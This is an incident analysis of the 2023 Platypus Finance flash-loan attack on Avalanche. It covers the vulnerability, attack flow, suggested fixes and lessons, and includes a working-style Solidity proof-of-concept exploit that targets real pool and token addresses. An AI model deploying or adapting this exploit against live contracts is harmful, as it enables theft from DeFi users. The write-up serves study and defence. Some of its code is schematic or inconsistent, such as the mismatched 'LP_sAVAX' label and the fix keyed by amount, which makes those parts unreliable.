# Platypus Finance 02 Price Manipulation Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | Platypus Finance (2nd Incident) |
| Date | 2023-07-25 |
| Chain | Avalanche |
| Loss | ~$51,000 USD |
| Attack Type | Flash Loan + Price Ratio Discrepancy |
| CWE | CWE-682 (Incorrect Calculation) |
| Attacker Address | `0xc64afc460290ed3df848f378621b96cb7179521a` |
| Attack Contract | `0x16a3c9e492dee1503f46dea84c52c6a0608f1ed8` |
| Vulnerable Contract | `0x9c80a455ecaca7025a45f5fa3b85fd6a462a447b` |
| Fork Block | 32,470,736 |

## 2. Vulnerability Code Analysis

The Platypus Finance pool contained a vulnerability in the exchange ratio calculation between USDC and USDTe. By depositing a large amount of USDC via flash loan to receive LP tokens, a manipulated ratio was applied when withdrawing LP tokens as USDTe.

```solidity
// Vulnerable pattern: ratio discrepancy during LP token withdrawal
contract PlatypusPool {
    function deposit(address token, uint256 amount) external returns (uint256 lpAmount) {
        // Deposit USDC → receive LP_USDC
        AssetInfo storage asset = assets[token];
        lpAmount = amount * asset.totalSupply / asset.cash;
        asset.cash += amount;
        asset.totalSupply += lpAmount;
        _mint(msg.sender, lpAmount);
    }

    function withdraw(address token, uint256 lpAmount) external returns (uint256 amount) {
        // Vulnerable: ratio discrepancy occurs when withdrawing a different token (USDTe)
        AssetInfo storage asset = assets[token];
        amount = lpAmount * asset.cash / asset.totalSupply;

        // Ratio gap: withdrawing USDTe using USDC-deposited LP yields more than deposited
        asset.cash -= amount;
        asset.totalSupply -= lpAmount;
        IERC20(token).transfer(msg.sender, amount);
    }
}
```

### On-Chain Original Code

Source: Bytecode decompilation

```solidity
// Root cause: Flash Loan + Price Ratio Discrepancy
// Source code unverified — based on bytecode analysis
```

**Vulnerability**: When withdrawing USDC LP as USDTe, a discrepancy in the ratio calculation between the two assets allowed the attacker to receive more USDTe than the deposited value.

## 3. Attack Flow

```
Attacker [0xc64afc460290ed3df848f378621b96cb7179521a]
  │
  ├─1─▶ Aave V3.flashLoan() [0x794a61358D6845594F94dc1DB02A252b5b4814aD]
  │      Borrow 85,000 USDC
  │
  ├─2─▶ PlatypusPool.deposit(USDC, 85000)
  │      [Platypus Pool: 0xbe52548488992Cc76fFA1B42f3A58F646864df45]
  │      Receive LP_USDC
  │      [LP_USDC: 0x06f01502327De1c37076Bea4689a7e44279155e9]
  │
  ├─3─▶ PlatypusPool.withdraw(USDTe, LP_USDC_balance)
  │      Withdraw USDTe using LP_USDC
  │      [LP_sAVAX: 0xA2A7EE49750Ff12bb60b407da2531dB3c50A1789]
  │      Receive more USDTe than deposited USDC due to ratio discrepancy
  │
  ├─4─▶ Swap USDTe → USDC
  │      Capture the profit spread
  │
  └─5─▶ Repay Aave flash loan + realize ~51K USD profit
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface IPlatypusPool {
    function deposit(address token, uint256 amount, address to, uint256 deadline) external returns (uint256);
    function withdraw(address token, uint256 liquidity, uint256 minimumAmount, address to, uint256 deadline) external returns (uint256);
    function swap(address fromToken, address toToken, uint256 fromAmount, uint256 minimumToAmount, address to, uint256 deadline) external returns (uint256, uint256);
}

contract Platypus02Exploit {
    IPlatypusPool pool = IPlatypusPool(0xbe52548488992Cc76fFA1B42f3A58F646864df45);
    IAaveFlashloan aaveV3 = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
    IERC20 USDC = IERC20(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E);
    IERC20 USDTe = IERC20(0xc7198437980c041c805A1EDcbA50c1Ce5db95118);
    IERC20 LP_USDC = IERC20(0x06f01502327De1c37076Bea4689a7e44279155e9);

    function testExploit() external {
        address[] memory assets = new address[](1);
        assets[0] = address(USDC);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 85_000e6;
        aaveV3.flashLoan(address(this), assets, amounts, new uint256[](1), address(this), "", 0);
    }

    function executeOperation(address[] calldata, uint256[] calldata amounts, uint256[] calldata premiums, ...) external returns (bool) {
        // Deposit USDC → receive LP_USDC
        USDC.approve(address(pool), amounts[0]);
        pool.deposit(address(USDC), amounts[0], address(this), block.timestamp);

        // Withdraw LP_USDC → USDTe (exploiting ratio discrepancy)
        uint256 lpBalance = LP_USDC.balanceOf(address(this));
        LP_USDC.approve(address(pool), lpBalance);
        pool.withdraw(address(USDTe), lpBalance, 0, address(this), block.timestamp);

        // Swap USDTe → USDC
        uint256 usdteBalance = USDTe.balanceOf(address(this));
        pool.swap(address(USDTe), address(USDC), usdteBalance, 0, address(this), block.timestamp);

        // Repay flash loan
        USDC.approve(address(aaveV3), amounts[0] + premiums[0]);
        return true;
    }
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-682 (Incorrect Calculation) |
| Vulnerability Type | Exchange ratio discrepancy, cross-token LP manipulation |
| Impact Scope | Platypus USDC-USDTe pool |
| Explorer | [Snowtrace](https://snowtrace.io/address/0xbe52548488992Cc76fFA1B42f3A58F646864df45) |

## 6. Security Recommendations

```solidity
// Fix 1: Restrict cross-token withdrawals
function withdraw(address token, uint256 lpAmount) external returns (uint256) {
    // Only allow withdrawal in the same token as deposited
    address depositedToken = userDepositToken[msg.sender];
    require(token == depositedToken, "Must withdraw same token as deposited");
    // ...
}

// Fix 2: Apply fee on cross-token withdrawals
function withdraw(address token, uint256 lpAmount) external returns (uint256) {
    AssetInfo storage asset = assets[token];
    uint256 amount = lpAmount * asset.cash / asset.totalSupply;

    // Additional fee for cross-token withdrawals
    if (token != lpToken[lpAmount]) {
        uint256 fee = amount * CROSS_TOKEN_FEE / 10000;
        amount -= fee;
        // Fee is distributed to liquidity providers
    }

    // ...
}

// Fix 3: Invariant check before and after withdrawal
function withdraw(...) external returns (uint256) {
    uint256 invariantBefore = calculateInvariant();
    // ... withdrawal logic
    uint256 invariantAfter = calculateInvariant();
    require(invariantAfter >= invariantBefore * 99 / 100, "Invariant violated");
}
```

## 7. Lessons Learned

1. **Cross-Token LP Withdrawal Risk**: Systems that allow withdrawing different assets using the same LP token are vulnerable to arbitrage that exploits ratio discrepancies.
2. **Repeated Attacks on Platypus**: Platypus Finance has been targeted by similar attack patterns multiple times since 2022. When the same protocol is attacked repeatedly, a fundamental design review is necessary.
3. **Stable Asset Pool Design**: Even in pools that assume a 1:1 peg, minor ratio discrepancies combined with flash loans can generate large-scale arbitrage profits.
4. **Avalanche DeFi Security**: DeFi protocols on Avalanche are exposed to the same flash loan-based attack patterns seen on BSC.